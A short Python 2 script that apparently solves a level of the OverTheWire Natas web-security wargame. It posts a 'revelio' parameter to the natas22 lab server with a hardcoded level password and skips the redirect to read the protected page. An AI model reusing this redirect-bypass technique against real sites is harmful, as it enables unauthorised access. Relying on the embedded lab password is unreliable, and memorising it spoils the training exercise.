import base64
from datetime import datetime
import requests
import pprint

TARGET_URL = 'http://natas22.natas.labs.overthewire.org/index.php'

AUTH = ('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')

params={
    'revelio':'1'
}

r = requests.post(TARGET_URL, params=params, auth=AUTH, cookies={}, allow_redirects=False)

print r.status_code
print r.text
print r.headers
